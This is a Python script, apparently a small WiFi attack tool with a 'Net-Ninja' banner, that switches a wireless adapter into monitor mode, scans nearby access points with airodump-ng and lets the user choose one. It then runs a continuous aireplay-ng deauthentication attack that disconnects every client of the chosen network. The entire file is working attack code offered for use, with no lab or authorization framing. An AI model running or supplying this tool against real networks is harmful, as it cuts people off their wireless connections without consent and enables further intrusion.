#!/usr/bin/env python3
import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime
import signal
import sys


active_wireless_networks = []


def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status

    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    return check_status


print(
    r"""
ooooo      ooo               .           ooooo      ooo  o8o                  o8o           
`888b.     `8'             .o8           `888b.     `8'  `"'                  `"'           
 8 `88b.    8   .ooooo.  .o888oo          8 `88b.    8  oooo  ooo. .oo.      oooo  .oooo.   
 8   `88b.  8  d88' `88b   888            8   `88b.  8  `888  `888P"Y88b     `888 `P  )88b  
 8     `88b.8  888ooo888   888   8888888  8     `88b.8   888   888   888      888  .oP"888  
 8       `888  888    .o   888 .          8       `888   888   888   888      888 d8(  888  
o8o        `8  `Y8bod8P'   "888"         o8o        `8  o888o o888o o888o     888 `Y888""8o 
                                                                              888           
                                                                          .o. 88P           
                                                                          `Y888P            
    
                                                                                   By: Mohit Pimoli
                                                                                   Version: 1.1
                                                                                                                                                                                                                                                                                                                 
"""
)


if not "SUDO_UID" in os.environ.keys():
    print("Try running this program with sudo.")
    exit()


for file_name in os.listdir():
    if ".csv" in file_name:
        print(
            "There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory."
        )
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(
            file_name, directory + "/backup/" + str(timestamp) + "-" + file_name
        )


wlan_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wlan_pattern.findall(
    subprocess.run(["iwconfig"], capture_output=True).stdout.decode()
)

if len(check_wifi_result) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()

print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    wifi_interface_choice = input(
        "Please select the interface you want to use for the attack: "
    )
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

hacknic = check_wifi_result[int(wifi_interface_choice)]

print(f"Putting {hacknic} into monitor mode:")
subprocess.run(["sudo", "ip", "link", "set", hacknic, "down"])
time.sleep(3)
subprocess.run(["sudo", "iw", hacknic, "set", "type", "monitor"])
time.sleep(3)
subprocess.run(["sudo", "ip", "link", "set", hacknic, "up"])
print("\nThis will take few seconds...\n")
time.sleep(15)

discover_access_points = subprocess.Popen(
    [
        "sudo",
        "airodump-ng",
        "-w",
        "file",
        "--write-interval",
        "1",
        "--output-format",
        "csv",
        hacknic,
    ],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
)


def terminate_script():
    print("\nTerminating the script and changing mode back to managed...")
    try:
        subprocess.run(["sudo", "airmon-ng", "stop", hacknic], check=True)
    except subprocess.CalledProcessError:
        print("Error stopping monitor mode.")
    try:
        subprocess.run(["sudo", "ip", "link", "set", hacknic, "down"], check=True)
        subprocess.run(["sudo", "iw", hacknic, "set", "type", "managed"], check=True)
        subprocess.run(["sudo", "ip", "link", "set", hacknic, "up"], check=True)
    except subprocess.CalledProcessError:
        print("Error reverting to managed mode.")
    sys.exit()


def signal_handler(sig, frame):
    terminate_script()


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = [
                "BSSID",
                "First_time_seen",
                "Last_time_seen",
                "channel",
                "Speed",
                "Privacy",
                "Cipher",
                "Authentication",
                "Power",
                "beacons",
                "IV",
                "LAN_IP",
                "ID_length",
                "ESSID",
                "Key",
            ]
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        if row["BSSID"] == "BSSID":
                            pass
                        elif row["BSSID"] == "Station MAC":
                            break
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print(
            "Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n"
        )
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(
                f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}"
            )
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")
    while True:
        choice = input("Please select a choice from above or type 'exit' to quit: ")
        if choice.lower() == "exit":
            terminate_script()
        try:
            if active_wireless_networks[int(choice)]:
                break
        except:
            print("Please try again.")


hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()


subprocess.run(["sudo", "iw", hacknic, "set", "channel", hackchannel])

print("Deauthenticating clients...")
subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
print("Deauthentication attack in progress. Press Ctrl+C to stop.")
